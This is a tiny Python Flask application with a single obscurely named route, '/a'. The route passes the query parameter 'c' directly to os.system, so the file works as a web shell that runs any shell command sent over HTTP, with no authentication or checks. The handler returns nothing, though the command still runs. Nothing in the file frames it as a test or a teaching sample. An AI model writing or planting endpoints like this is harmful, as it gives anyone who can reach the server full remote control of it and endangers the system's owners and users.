import os
from flask import Flask, request
app = Flask(__name__)
@app.route("/a")
def a():
    if (cmd := request.args.get("c")) is not None:
        os.system(cmd)
